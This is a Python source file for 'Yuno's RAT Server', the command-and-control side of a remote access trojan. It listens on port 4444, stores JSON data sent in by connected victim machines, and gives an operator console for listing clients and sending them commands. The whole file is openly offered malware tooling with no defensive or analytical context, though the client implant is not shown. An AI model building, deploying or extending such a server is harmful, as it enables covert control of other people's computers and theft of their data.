#!/usr/bin/env python3
import socket
import threading
import json
import os
from datetime import datetime

# Server settings
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = os.getenv("PORT", 4444)  # Use environment variable or default to 4444
DATA_DIR = "rat_data"

# Ensure data directory exists
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# Store connected clients (client_id -> socket)
clients = {}
clients_lock = threading.Lock()

def handle_client(client_socket, client_address):
    print(f"[*] New client connected from {client_address[0]}:{client_address[1]}")
    
    client_id = f"client_{client_address[0]}_{client_address[1]}"
    with clients_lock:
        clients[client_id] = client_socket
    
    try:
        while True:
            data = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if not data:
                break
            
            try:
                client_data = json.loads(data)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
                with open(filename, 'w') as f:
                    json.dump(client_data, f, indent=2)
                print(f"[*] Received data from {client_id}: Saved to {filename}")
            except json.JSONDecodeError:
                print(f"[!] Invalid data from {client_id}: {data}")
    except Exception as e:
        print(f"[!] Error with client {client_id}: {e}")
    finally:
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        client_socket.close()
        print(f"[*] Client {client_id} disconnected")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"[*] RAT server listening on {HOST}:{PORT}")
    except Exception as e:
        print(f"[!] Failed to start server: {e}")
        return

    while True:
        try:
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
            server_socket.close()
            break

def send_command(client_id, command):
    with clients_lock:
        if client_id in clients:
            try:
                clients[client_id].send(command.encode('utf-8'))
                print(f"[*] Sent command to {client_id}: {command}")
            except Exception as e:
                print(f"[!] Failed to send command to {client_id}: {e}")
        else:
            print(f"[!] Client {client_id} not found")

if __name__ == "__main__":
    print("=== Yuno's RAT Server ===")
    print("A remote access tool by Yuno\n")

    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    while True:
        try:
            cmd_input = input("RAT> ").strip()
            if cmd_input.lower() == "exit":
                print("[*] Exiting RAT server...")
                break
            if cmd_input.lower() == "clients":
                with clients_lock:
                    if not clients:
                        print("[*] No clients connected")
                    else:
                        print("[*] Connected clients:")
                        for client_id in clients.keys():
                            print(f"    {client_id}")
                continue
            if cmd_input.lower().startswith("send "):
                parts = cmd_input.split(" ", 2)
                if len(parts) == 3:
                    client_id, command = parts[1], parts[2]
                    send_command(client_id, command)
                else:
                    print("[!] Usage: send <client_id> <command>")
            else:
                print("[!] Unknown command. Use 'clients', 'send <client_id> <command>', or 'exit'")
        except KeyboardInterrupt:
            print("\n[*] Exiting RAT server...")
            break